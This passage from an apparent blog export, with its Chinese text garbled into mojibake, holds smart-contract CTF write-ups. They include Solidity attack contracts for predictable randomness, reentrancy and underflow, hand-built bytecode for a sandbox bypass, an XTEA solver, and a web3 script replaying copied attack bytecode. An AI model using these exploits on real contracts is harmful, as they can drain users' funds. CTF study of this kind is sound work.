sendFlag() public payable &#123; require(msg.value &gt;= 1000000000 ether); emit ForFlag(msg.sender); &#125;&#125; Analyse åˆçº¦çš„ constructor å‡½æ•°ä¸­éƒ¨ç½²çš„åˆçº¦æ‰æ˜¯çœŸæ­£çš„åˆçº¦ï¼Œæ‰€ä»¥åˆ†æžæž„é€ å‡½æ•°é‡Œé¢çš„å­—èŠ‚ç å³å¯ å…¶å®žç›¸å½“äºŽä¸€ä¸ªæ²™ç›’ï¼Œè¿‡æ»¤äº† f0 f1 f2 f4 fa ff è¿™äº›å­—èŠ‚ï¼Œå³æ”»å‡»åˆçº¦ä¸­å­—èŠ‚ç ä¸èƒ½å‡ºçŽ°è¿™äº›å­—èŠ‚ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ª emit ForFlag(0) çš„åˆçº¦ï¼Œä¸­é—´å¦‚æžœæœ‰ç¦æ­¢çš„å­—èŠ‚ï¼Œè½¬æ¢ä¸€ä¸‹å³å¯ Exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859contract pikachu &#123; /* emit ForFlag(address(0)); 7F PUSH32 0x89814845d4f005a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e2 60 PUSH1 0x00 60 PUSH1 0x40 51 MLOAD 80 DUP1 82 DUP3 73 PUSH20 0xffffffffffffffffffffffffffffffffffffffff 16 AND 73 PUSH20 0xffffffffffffffffffffffffffffffffffffffff 16 AND 81 DUP2 52 MSTORE 60 PUSH1 0x20 01 ADD 91 SWAP2 50 POP 50 POP 60 PUSH1 0x40 51 MLOAD 80 DUP1 91 SWAP2 03 SUB 90 SWAP1 A1 LOG1 */ // å°†ä¸Šè¿°å­—èŠ‚ç é€šè¿‡ä¸€äº›è½¬æ¢ä¸åŒ…å«f0 f1 f2 f4 fa ffå³å¯ constructor() public payable &#123; assembly &#123; mstore(0x500, 0x7f89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9) mstore(0x520, 0xe27f000000000010000000000000000000000000000000000100000000000000) mstore(0x540, 0x0000016000604051808273eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee73) mstore(0x560, 0x1111111111111111111111111111111111111111011673eeeeeeeeeeeeeeeeee) mstore(0x580, 0xeeeeeeeeeeeeeeeeeeeeee731111111111111111111111111111111111111111) mstore(0x5a0, 0x0116815260200191505060405180910390a13460b26105003031f50000000000) return(0x500, 0x5c0) &#125; &#125;&#125;contract Hack &#123; BoxGame private constant target = BoxGame(0x4c3aa84018A031C11bE09e4b2dCC346Ae055956d); constructor() public payable &#123; bool result; // emit ForFlag(0) pikachu hack = new pikachu(); (result, ) = address(target).call(abi.encodeWithSelector( 0xc1803191, hack )); require(result); &#125;&#125; ç›´æŽ¥éƒ¨ç½² Hack å³å¯]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Smart Contract</tag>
        <tag>åŽä¸ºé²²é¹è®¡ç®— ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åŽä¸ºäº‘å®‰å…¨åœºåŒºå—é“¾ ethenc]]></title>
    <url>%2F2020%2Fethenc%2F</url>
    <content type="text"><![CDATA[å‰è¨€ åŽä¸ºäº‘å®‰å…¨åœºåŒºå—é“¾é¢˜ç›® å…¶å®žå¾ˆç®€å•ï¼Œå’ŒåŒºå—é“¾å…³ç³»ä¸å¤§ Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130pragma solidity ^0.6.12;contract EthEnc &#123; address private owner; //0 uint private key; //1 uint private delta; //2 uint public output; //3 uint32 private sum; uint224 private tmp_sum=0; //4 uint32 private key0; uint224 private t0=0; //5 uint32 private key1; uint224 private t1=0; //6 uint32 private key2; uint224 private t2=0; //7 uint32 private key3; uint224 private t3=0; //8 uint randomNumber = 0; string private s; event OhSendFlag(address addr); constructor() public payable &#123; // key = 0x74686974 5f69735e 5f746573 746b6579 key = 0x746869745f69735e5f746573746b6579; delta = 0xb3c6ef3720; &#125; modifier auth &#123; require(msg.sender == owner || msg.sender == address(this), &quot;EthEnc: not authorized&quot;); _; &#125; function payforflag() public auth &#123; require(output == 2282910687825444608285583946662268071674116917685196567156); emit OhSendFlag(msg.sender); selfdestruct(msg.sender); &#125; function Convert(string memory source) internal pure returns (uint result) &#123; bytes32 tmp; assembly &#123; tmp := mload(add(source, 32)) &#125; result = uint(tmp) / 0x10000000000000000; &#125; // æ­£ 0x 5f5f6f68 5f66616e 74616e73 69746963 5f626162 795f5f5f __oh_fantansitic_baby___ function set_s(string memory _s) public &#123; s = _s; &#125; function Encrypt() public &#123; uint tmp = Convert(s); assembly &#123; let first,second sstore(5, and(shr(96, sload(1)), 0xffffffff)) sstore(6, and(shr(64, sload(1)), 0xffffffff)) sstore(7, and(shr(32, sload(1)), 0xffffffff)) sstore(8, and(sload(1), 0xffffffff)) let step := 1 for &#123; let i := 1 &#125; lt(i, 4) &#123; i := add(i, 1) &#125; &#123; first := and(shr(mul(add(sub(24, mul(i, 8)), 4), 8), tmp), 0xffffffff) second := and(shr(mul(sub(24, mul(i, 8)), 8), tmp), 0xffffffff) sstore(4, 0) for &#123;let j := 0 &#125; lt(j, 32) &#123; j := add(j, 1) &#125; &#123; let tmp11,tmp12 let tmp21,tmp22 tmp11 := and(add(xor(and(mul(second, 16), 0xffffffff), and(div(second, 32), 0xffffffff)), second), 0xffffffff) switch and(and(sload(4),0xffffffff), 3) case 0 &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(5),0xffffffff)), 0xffffffff) &#125; case 1 &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(6),0xffffffff)), 0xffffffff) &#125; case 2 &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(7),0xffffffff)), 0xffffffff) &#125; default &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(8),0xffffffff)), 0xffffffff) &#125; first := and(add(first, xor(tmp11, tmp12)), 0xffffffff) sstore(4, and(add(and(sload(4), 0xffffffff), shr(5, sload(2))), 0xffffffff)) tmp21 := and(add(xor(and(mul(first, 16), 0xffffffff), and(div(first, 32), 0xffffffff)), first), 0xffffffff) switch and(and(shr(11, and(sload(4),0xffffffff)), 0xffffffff), 3) case 0 &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(5),0xffffffff)), 0xffffffff) &#125; case 1 &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(6),0xffffffff)), 0xffffffff) &#125; case 2 &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(7),0xffffffff)), 0xffffffff) &#125; default &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(8),0xffffffff)), 0xffffffff) &#125; second := and(add(second, xor(tmp21, tmp22)), 0xffffffff) &#125; sstore(3, add(sload(3), add(shl(sub(192, mul(step, 32)), first), shl(sub(192, mul(i, 64)), second)))) step := add(step, 2) &#125; &#125; &#125; receive() external payable &#123; if(msg.value == 0) &#123; this.payforflag(); &#125; else &#123; this.Encrypt(); &#125; &#125;&#125; Analyse é¢˜ç›®éœ€è¦é€†å‘ï¼Œä¸Šé¢æ˜¯æºç  è€ƒç‚¹æœ‰ä¸‰ä¸ªï¼š è€ƒå¯Ÿå¯¹ evm é€†å‘èƒ½åŠ› è€ƒå¯Ÿ xtea åŠ è§£å¯† è€ƒå¯Ÿ fallback åŠ msg.sender çš„ç†è§£ Exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i &lt; num_rounds; i++) &#123; v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); sum += delta; v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); &#125; v[0]=v0; v[1]=v1;&#125;void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i &lt; num_rounds; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; v[0]=v0; v[1]=v1;&#125;int main()&#123; unsigned int i; uint32_t const k[4]=&#123;0x74686974,0x5f69735e,0x5f746573,0x746b6579&#125;; unsigned int r=32; // 2282910687825444608285583946662268071674116917685196567156 = 0x5d1ab31f6a103c8f364d33e96dbdd5cdbd40d15e55c23274 uint32_t enc1[2] = &#123;0x5d1ab31f, 0x6a103c8f&#125;; uint32_t enc2[2] = &#123;0x364d33e9, 0x6dbdd5cd&#125;; uint32_t enc3[2] = &#123;0xbd40d15e, 0x55c23274&#125;; char flag[50]; decipher(r, enc1, k); decipher(r, enc2, k); decipher(r, enc3, k); printf(&quot;è§£å¯†åŽçš„æ•°æ®ï¼š%x %x %x %x %x %x\n&quot;,enc1[0],enc1[1],enc2[0],enc2[1],enc3[0],enc3[1]); // 0x5f5f6f685f66616e74616e73697469635f626162795f5f5f int s[24] = &#123;0x5f, 0x5f, 0x6f, 0x68, 0x5f, 0x66, 0x61, 0x6e, 0x74, 0x61, 0x6e, 0x73, 0x69, 0x74, 0x69, 0x63, 0x5f, 0x62, 0x61, 0x62, 0x79, 0x5f, 0x5f, 0x5f&#125;; for (i=0; i&lt;24; i++) &#123; printf(&quot;%c&quot;, s[i]); &#125; return 0;&#125; ä¸Šé¢çš„ exp å¯ä»¥è®¡ç®—å‡º s ç„¶åŽè°ƒç”¨ set_s(s)ï¼Œè°ƒç”¨ Encrypt() æœ€åŽç»™åˆçº¦è½¬è´¦é‡‘é¢ 0ï¼Œè§¦å‘ receive å‡½æ•°è°ƒç”¨ payforflag å³å¯]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Smart Contract</tag>
        <tag>åŽä¸ºäº‘å®‰å…¨ ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bjdctf_4th]]></title>
    <url>%2F2020%2Fbjdctf-4th%2F</url>
    <content type="text"><![CDATA[å‰è¨€ é¦–å…ˆåœ£è¯žå“ˆçš®ä¸«ï¼Œåœ£è¯žå‚åŠ äº† BJDCTF 4th ï¼Œå¯æƒœç”±äºŽæ˜¯å‘¨äº”ï¼Œæ—¶é—´ä¸å¤ªå……è¶³ï¼Œå¤§æ¦‚æ€»çš„åšé¢˜æ—¶é—´å°±ä¸¤ä¸ªå°æ—¶ï¼Œå°±åªæŠŠè‡ªå·±æ“…é•¿çš„åŒºå—é“¾çš„é¢˜ç›®åšäº†ä¸€ä¸‹ æ„Ÿè°¢å‡ºé¢˜äººå°çº¢èŠ±å¸ˆå‚…æ²¡æœ‰æš´æ‰“æˆ‘ è¿™é‡Œä¸ä¼šä»‹ç»é¢˜ç›®ï¼Œåªæ˜¯éšä¾¿è°ˆä¸€äº›æ„Ÿæ…¨å§ï¼ˆä¸»è¦æ˜¯æˆ‘ä¹Ÿä¸çŸ¥é“é¢˜ç›®éƒ½åœ¨è€ƒå¯Ÿä»€ä¹ˆï¼Œå› ä¸ºæˆ‘æ²¡åŽ»åˆ†æžï¼Œé ç€å¼ºå¤§çš„æš—é»‘ä¹‹åŠ›ï¼Œæˆ‘æ‰¾åˆ°äº†é“¾ä¸Šå°çº¢èŠ±å¸ˆå‚…æµ‹è¯•çš„äº¤æ˜“ï¼Œç„¶åŽå¤§å®¶éƒ½æ‡‚çš„ï¼Œæˆ‘å°±ç›´æŽ¥å¤ç”¨äº†ï¼‰ ä¸»è¦æƒ³è¯´çš„æ˜¯ï¼Œå¯¹äºŽåŒºå—é“¾çš„é¢˜ç›®ï¼Œå¦‚æžœç†è§£äº†æœ¬è´¨ï¼Œéƒ½æ˜¯å¾ˆå®¹æ˜“çš„ çŽ°åœ¨åŒºå—é“¾é¢˜ç›®è¿˜æ²¡æœ‰ä¸€ä¸ªå½»åº•çš„èƒ½å¤Ÿè§£å†³æˆ‘è¿™ç§â€œæŠ„ä½œä¸šâ€çŽ°è±¡çš„æ–¹æ¡ˆï¼Œé™¤éžä½ æ˜¯ç»™æ¯ä¸ªé˜Ÿä¼ä¸€æ¡ç§é“¾ï¼Œè¿˜å¾—ä¿è¯äº’ç›¸ä¸èƒ½è®¿é—®ï¼Œä½†å¦‚æžœæ˜¯çº¿ä¸‹èµ›æˆ–è€…rwçš„è¯æ˜¯å¯ä»¥ä¿è¯çš„ï¼Œä½†å¯¹äºŽçº¿ä¸Šèµ›è¿™ç§ï¼Œç›®å‰æ˜¯æ²¡æœ‰è§£å†³åŠžæ³•çš„ ä¸è¿‡å¸Œæœ›çœ‹åˆ°æ–‡ç« çš„åŒå­¦ä¸è¦å­¦æˆ‘å“ˆï¼Œæˆ‘è¿™æ¬¡æ¯”èµ›æœ¬æ¥æ˜¯æƒ³ç€è‡ªå·±å¥½å¥½åšä¸€ä¸‹å­çš„ï¼Œå› ä¸ºä¹Ÿå¥½ä¹…æ²¡æœ‰åšè¿‡é¢˜äº†ï¼Œæƒ³çœ‹ä¸€ä¸‹è‡ªå·±åšé¢˜çš„èƒ½åŠ›ï¼Œç»“æžœç”±äºŽå‘¨äº”äº‹æƒ…æ¯”è¾ƒå¤šï¼Œæ€»çš„æ¯”èµ›æ—¶é—´ä¹Ÿä¸è¿‡å°±2ä¸ªå°æ—¶ï¼Œæˆ‘å°±å·äº†ä¸ªæ‡’ï¼Œç›´æŽ¥åŽ»æ‰¾äº¤æ˜“äº†ï¼ˆé€ƒ ä¸è¿‡çŽ°åœ¨çš„åŒºå—é“¾æ¯”èµ›å·²ç»æ¯”ä¹‹å‰å¥½å¤šäº†ï¼Œå‡ºé¢˜äººä¹Ÿå°½é‡ä¼šè€ƒè™‘åˆ°è¿™ä¸ªé—®é¢˜ï¼Œè™½ç„¶è¿˜ä¸èƒ½å®Œå…¨è§£å†³ï¼Œä½†æ˜¯åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ˜¯å‡è½»äº†è¿™ç§â€œæŠ„ä½œä¸šâ€çš„èƒ½åŠ›ï¼Œä¹Ÿå¸Œæœ›æœ‰æƒ³æ³•çš„å„ä½ðŸ‘´å¯ä»¥ä¸Žæˆ‘æŽ¢è®¨è§£å†³æ–¹æ¡ˆ å¥½å•¦ï¼Œå…¶å®žä¹Ÿæ²¡å¤ªå¤šæƒ³è¯´çš„ï¼Œä¸»è¦è¿˜æ˜¯æ˜¨å¤©çš„èŠ‚æ—¥å¿«ä¹ä¸«ï¼Œè¿Ÿæ¥çš„ç¥ç¦ç•¥ç•¥ç•¥]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>BJDCTF 4th</tag>
        <tag>Smart Contract</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Security Innovation]]></title>
    <url>%2F2020%2Fsecurityinnovation%2F</url>
    <content type="text"><![CDATA[å‰è¨€ åŒåä¸€å“ˆçš®ðŸ¶ https://blockchain-ctf.securityinnovation.com/#/ åšäº†ä¸€éï¼Œæ„Ÿè§‰è¿™ä¸ªç½‘ç«™ä¸Šé¢çš„é¢˜ç›®å¯èƒ½æ›´è´´è¿‘å®žé™…ä¸€äº›ï¼Œæ–°æ‰‹å°ç™½åˆ·å®Œ https://ethernaut.openzeppelin.com/ ä¹‹åŽï¼Œå¯ä»¥é€‰æ‹©æ€§æ¥åšè¿™ä¸ªç½‘ç«™çš„é¢˜ç›® éš¾åº¦è¿˜æ˜¯æœ‰çš„ï¼Œè¿˜æœ‰å¾ˆå¤šå° trick ï¼Œç›®å‰ä¸Šé¢æ˜¯ 13 é“é¢˜ç›® çœ‹äº†ã€Šæ•°ç å®è´ï¼šæœ€åŽçš„è¿›åŒ–ã€‹ï¼Œçˆ·é’ç»“ï¼Œç„¶åŽå‘çŽ°å¥½ä¹…æ²¡åšé¢˜äº†ï¼Œç†Ÿæ‚‰ä¸€ä¸‹åšé¢˜ï¼Œå¤§ä½¬å‹¿å–·ï¼Œä¸æ˜¯ WP ï¼Œéšä¾¿å†™ä¸€ä¸‹ å¾ˆå¤šæ˜¯å‚è€ƒäº†ç½‘ä¸Šçš„ wp çš„å†…å®¹ æ‡’ç™Œæ‚£è€… :) Donation ç›´æŽ¥è°ƒç”¨ withdrawDonationsFromTheSuckersWhoFellForIt å‡½æ•°å³å¯ Lock Box è€ƒç‚¹æ˜¯ EVM ä¸­ storage å­˜å‚¨çš„è¯»å– 1await web3.eth.getStorageAt(ContractAddress, &quot;1&quot;, function(x,y)&#123;console.info(y);&#125;) Piggy Bank è€ƒç‚¹æ˜¯ç»§æ‰¿ï¼Œé‡å†™çš„ collectFunds å‡½æ•°å®žé™…ä¸Šè¦†ç›–äº† PiggyBank ä¸­çš„åŒåå‡½æ•° ç›´æŽ¥è°ƒç”¨ collectFunds(piggyBalance) å³å¯ SI Token Sale æº¢å‡ºæ¼æ´ž balances[msg.sender] += _value â€“ feeAmount åªè¦ä¼ å…¥ä¸€ä¸ªå°äºŽ feeAmount çš„ _value ï¼Œå³å¯è®©æˆ‘ä»¬çš„ balances ä¸‹æº¢ï¼Œæ¯”å¦‚å‘é€ 1 gasï¼Œç„¶åŽå³å¯è°ƒç”¨ refundTokens å‡½æ•°å°†åˆçº¦çš„ä½™é¢æ¸…ç©ºï¼Œå› ä¸ºè¿™é‡Œæ˜¯å°† _value é™¤ 2 å¾—åˆ°æå–çš„ä½™é¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†åˆçº¦çš„ etherCollection ä¹˜ 2 ä½œä¸º _value å³å¯ Secure Bank MembersBank åˆçº¦è·Ÿ SecureBank åˆçº¦çš„ withdraw å‡½æ•°çš„å‚æ•°ç±»åž‹ä¸åŒï¼Œä¸€ä¸ªçš„ _value æ˜¯ uint8ï¼Œå¦ä¸€ä¸ªå´æ˜¯ uint256ï¼Œè¿™æ ·è¿™ä¸¤ä¸ªå‡½æ•°çš„ç­¾åå°±ä¸ç›¸åŒäº†ï¼Œåœ¨åˆçº¦é‡Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªä¸åŒçš„å‡½æ•°ï¼Œä¸è¿‡å®ƒä»¬ä½¿ç”¨ super.withdraw æœ€ç»ˆéƒ½ä¼šè°ƒç”¨ SimpleBank çš„ withdraw å‡½æ•° MembersBank ä¸­ä»…éœ€è¦æ˜¯æ³¨å†Œç”¨æˆ·å³å¯ï¼Œæ‰€ä»¥è¿™é¢˜çš„æµç¨‹å°±æ˜¯å…ˆè°ƒç”¨ register å‡½æ•°æ³¨å†Œä¸€ä¸‹ï¼Œç„¶åŽä½¿ç”¨ etherscan åœ¨æŒ‘æˆ˜åˆçº¦çš„åˆ›å»ºäº¤æ˜“é‡ŒæŸ¥çœ‹ä¸€ä¸‹åˆçº¦çš„åˆ›å»ºè€…ï¼Œå› ä¸ºåˆçº¦çš„ ether éƒ½å­˜åœ¨äº†å®ƒçš„è´¦æˆ·ä¸Šï¼Œç„¶åŽæˆ‘ä»¬ç›´æŽ¥ä½¿ç”¨è¿™ä¸ªåœ°å€æ¥è°ƒç”¨ MembersBank ä¸­çš„ withdraw å‡½æ•°å³å¯ï¼Œä¹Ÿå°±æ˜¯æ‰¾åˆ°å‚æ•°ç±»åž‹ä¸º uint256 çš„å‡½æ•° Lottery éšæœºæ•°é¢„æµ‹ 12345678910111213contract attack &#123; address instance_address = your challenge address; Lottery target = Lottery(your challenge address); function pwn() payable&#123; bytes32 entropy = block.blockhash(block.number); bytes32 entropy2 = keccak256(this); uint256 seeds = uint256(entropy^entropy2); target.play.value(msg.value)(seeds); &#125; function () payable&#123;&#125;&#125; Heads or Tails éšæœºæ•°æ¼æ´ž æ¯æ¬¡çŒœå¯¹å¯ä»¥èŽ·å¾—èµŒæ³¨çš„ 1.5 å€ï¼Œå› ä¸ºæ¯æ¬¡ä¸‹æ³¨åªèƒ½ä¸º 0.1 etherï¼Œæ‰€ä»¥ä¸€æ¬¡çš„æ”¶ç›Šä¸º 0.05 etherï¼Œè¦å°†åˆçº¦çš„ ether æ¸…ç©ºéœ€è¦ 20 æ¬¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æŽ¥åœ¨åˆçº¦ä¸­å¾ªçŽ¯è°ƒç”¨ 20 æ¬¡å³å¯ 123456789101112131415161718contract attack &#123; address instance_address = your challenge address; HeadsOrTails target = HeadsOrTails(your challenge address); function pwn() payable &#123; bytes32 entropy = block.blockhash(block.number-1); bytes1 coinFlip = entropy[0] &amp; 1; for(int i=0;i&lt;20;i++)&#123; if (coinFlip == 1)&#123; target.play.value(100000000000000000)(true); &#125; else &#123; target.play.value(100000000000000000)(false); &#125; &#125; &#125; function () payable &#123;&#125;&#125; Record Label è°ƒç”¨ withdrawFundsAndPayRoyalties å‡½æ•°æ—¶ä¼šå°†å¯¹åº”çš„ _withdrawAmount å…¨éƒ¨å‘é€è‡³ Royalties åˆçº¦ï¼Œè€Œ Royalties ä¼šå°†å…¶ä¸­çš„ 80% å‘é€ç»™åˆ›å»ºè€…ï¼Œå‰©ä¸‹çš„ 20% å‘å›žåŽ»ï¼ŒæŽ¥ç€ withdrawFundsAndPayRoyalties ä¸­åˆä¼šå°†è¿™ 20% å‘é€ç»™æˆ‘ä»¬ æ‰€ä»¥æˆ‘ä»¬ç›´æŽ¥å°† _withdrawAmount è®¾ä¸º 1 ether æ¥è°ƒç”¨ withdrawFundsAndPayRoyalties å‡½æ•°å³å¯ Trust Fund é‡å…¥æ¼æ´ž 1234567891011contract attack &#123; address instance_address = your challenge address; TrustFund target = TrustFund(your challenge address); function pwn()&#123; target.withdraw(); &#125; function() payable &#123; target.withdraw(); &#125;&#125; Slot Machine selfdestruct ä¸ä¼šè§¦å‘ fallback payable å‡½æ•° Rainy Day Fund è¿™ä¸ªé¢˜ç›®ä¹ŸæŒºæœ‰æ„æ€ï¼Œè€ƒç‚¹æ˜¯ create çš„è®¡ç®—æ–¹å¼ï¼Œæå‰å‘å¯é¢„æµ‹çš„åœ°å€è½¬è´¦ åˆçº¦è´¦æˆ·éƒ¨ç½²åˆçº¦ï¼Œnonce ä»Ž 1 å¼€å§‹è®¡ç®— å¤–éƒ¨è´¦æˆ·éƒ¨ç½²åˆçº¦ï¼Œnonce ä»Ž 0 å¼€å§‹è®¡ç®— Raffle blockhash è¿™ä¸ªå‡½æ•°ï¼Œå®ƒå¯ä»¥èŽ·å–ç»™å®šçš„åŒºå—å·çš„ hash å€¼ï¼Œä½†åªæ”¯æŒæœ€è¿‘çš„ 256 ä¸ªåŒºå—ï¼Œä¸åŒ…å«å½“å‰åŒºå—ï¼Œå¯¹äºŽ 256 ä¸ªåŒºå—ä¹‹å‰çš„å‡½æ•°å°†è¿”å›ž 0 è§¦å‘ fallback å‡½æ•°åŽï¼Œè‹¥ fallback å‡½æ•°ä¸­åˆè°ƒç”¨äº†è‡ªèº«å‡½æ•°ï¼Œé‚£ä¹ˆæ­¤æ—¶ï¼Œmsg.sender å˜æˆäº†è‡ªèº« æ‰€ä»¥å…ˆè°ƒç”¨ buyTicket ï¼Œç„¶åŽ ctf_challenge_add_authorized_sender è®¤è¯é¢˜ç›®åˆçº¦åœ°å€ï¼ˆè¿™æ˜¯å› ä¸ºæŽ¥ä¸‹æ¥ä¼šè§¦å‘ fallback å‡½æ•°ä¿®æ”¹äº† msg.senderï¼‰ï¼ŒæŽ¥ç€ç­‰å¾… 256 ä¸ªåŒºå—åŽè§¦å‘ fallback å‡½æ•°ä¸­ msg.value=0 è¿™æ¡åˆ†æ”¯è°ƒç”¨ closeRaffle å‡½æ•°ï¼Œæœ€åŽè°ƒç”¨ collectReward å³å¯ Scratchcard è¿™é“é¢˜æˆ‘åšçš„å¾ˆç®€å•ï¼Œç®€å•åˆ†æžäº†ä¸€ä¸‹é¢˜ç›®çš„é€»è¾‘ï¼Œå¤§è‡´å¾—åˆ°å¿…é¡»å¾—æ˜¯ç¬¬ä¸‰æ–¹åˆçº¦å’Œå…¶äº¤äº’ï¼Œå¹¶ä¸”åªèƒ½åœ¨æž„é€ å‡½æ•°ä¸­å®ŒæˆåŠŸèƒ½é€»è¾‘ï¼Œæ‰€ä»¥æˆ‘å°±åŽ»é“¾ä¸Šæ‰¾è®°å½•åŽ»äº†2333ï¼ŒæˆåŠŸæ‰¾åˆ°ä¸€ä¸ªåˆ«äººåšè¿‡çš„åˆçº¦åœ°å€ 0xD38308cb90F17a5aB1B4DD805f69Eb5798536Eeaï¼Œå®Œç¾Žï¼Œç„¶åŽæŸ¥çœ‹å…¶å†…éƒ¨äº¤æ˜“ï¼ˆå› ä¸ºæ˜¯ç¬¬ä¸‰æ–¹åˆçº¦ä¸Žé¢˜ç›®è¿›è¡Œäº¤äº’ï¼Œæ‰€ä»¥æ˜¯å†…éƒ¨äº¤æ˜“ï¼‰ï¼Œç‚¹å¼€äº¤æ˜“å³å¯çœ‹åˆ° Input Data 10x60806040526040516020806102c08339810180604052810190808051906020019092919050505060006402540be4006305f5e1004281151561003d57fe5b0602600081905550600190505b601981111515610113578173ffffffffffffffffffffffffffffffffffffffff1660005460405180807f706c617928290000000000000000000000000000000000000000000000000000815250600601905060405180910390207c01000000000000000000000000000000000000000000000000000000009004906040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040160006040518083038185885af1935050505050808060010191505061004a565b8173ffffffffffffffffffffffffffffffffffffffff1660405180807f636f6c6c6563744d6567614a61636b706f742875696e74323536290000000000815250601b01905060405180910390207c010000000000000000000000000000000000000000000000000000000090046730927f74c9de00006040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808267ffffffffffffffff1681526020019150506000604051808303816000875af19250505050505060d2806101ee6000396000f3006080604052600436106049576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063a035b1fe14604b578063fc4333cd146073575b005b348015605657600080fd5b50605d6087565b6040518082815260200191505060405180910390f35b348015607e57600080fd5b506085608d565b005b60005481565b3373ffffffffffffffffffffffffffffffffffffffff16ff00a165627a7a72305820657390e5500a8446cf4b6fedd6a0ea0a1c3824339e44080120130ef94540ff5d0029000000000000000000000000428c0e1d593d7b85253f2dcf48bfb7626d7ce7e2 ç„¶åŽæˆ‘æŠŠ Input Data ä¸­æ¢æˆæˆ‘è‡ªå·±çš„é¢˜ç›®åˆçº¦åœ°å€å°±è¡Œäº†ï¼ˆåœ¨å­—èŠ‚ç çš„æœ€åŽï¼‰ ç„¶åŽæŒ‰ç…§ create è®¡ç®—åœ°å€æ–¹æ³•ï¼Œè®¡ç®—å‡ºæˆ‘è‡ªå·±å¤–éƒ¨è´¦æˆ·éƒ¨ç½²æ­¤æ”»å‡»åˆçº¦çš„åœ°å€ 0xf297e7d46bdc54cdfa1cfda71e7ff0368f416705, æå‰è¿›è¡Œ ctf_challenge_add_authorized_sender è®¤è¯ 12345678910import rlpfrom ethereum import utilsaddress = 0x88D3052D12527F1FbE3a6E1444EA72c4DdB396c2nonce = 413rlp_res = rlp.encode([address,nonce])print(rlp_res)sha3_res = utils.mk_contract_address(address,nonce)print(sha3_res)sha3_res_de = utils.decode_addr(sha3_res)print(&quot;contract_address: &quot; + sha3_res_de) æœ€åŽå°†æ”»å‡»åˆçº¦éƒ¨ç½²å³å¯ 12345678910111213141516171819202122232425262728from web3 import Web3, HTTPProviderw3 = Web3(Web3.HTTPProvider(&apos;https://ropsten.infura.io/v3/xxxxxx&apos;))contract_address = &quot;0x428c0e1d593d7b85253f2dcf48bfb7626d7ce7e2&quot;private = &quot;xxx&quot;public = &quot;0x88D3052D12527F1FbE3a6E1444EA72c4DdB396c2&quot;data = &apos;0x60806040526040516020806102c08339810180604052810190808051906020019092919050505060006402540be4006305f5e1004281151561003d57fe5b0602600081905550600190505b601981111515610113578173ffffffffffffffffffffffffffffffffffffffff1660005460405180807f706c617928290000000000000000000000000000000000000000000000000000815250600601905060405180910390207c01000000000000000000000000000000000000000000000000000000009004906040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040160006040518083038185885af1935050505050808060010191505061004a565b8173ffffffffffffffffffffffffffffffffffffffff1660405180807f636f6c6c6563744d6567614a61636b706f742875696e74323536290000000000815250601b01905060405180910390207c010000000000000000000000000000000000000000000000000000000090046730927f74c9de00006040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808267ffffffffffffffff1681526020019150506000604051808303816000875af19250505050505060d2806101ee6000396000f3006080604052600436106049576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063a035b1fe14604b578063fc4333cd146073575b005b348015605657600080fd5b50605d6087565b6040518082815260200191505060405180910390f35b348015607e57600080fd5b506085608d565b005b60005481565b3373ffffffffffffffffffffffffffffffffffffffff16ff00a165627a7a72305820657390e5500a8446cf4b6fedd6a0ea0a1c3824339e44080120130ef94540ff5d0029000000000000000000000000&apos;data += &apos;428c0e1d593d7b85253f2dcf48bfb7626d7ce7e2&apos;def do_callme(public): txn = &#123; &apos;from&apos;: Web3.toChecksumAddress(public), # &apos;to&apos;: Web3.toChecksumAddress(contract_address), &apos;gasPrice&apos;: w3.eth.gasPrice, &apos;gas&apos;: 3000000, &apos;nonce&apos;: 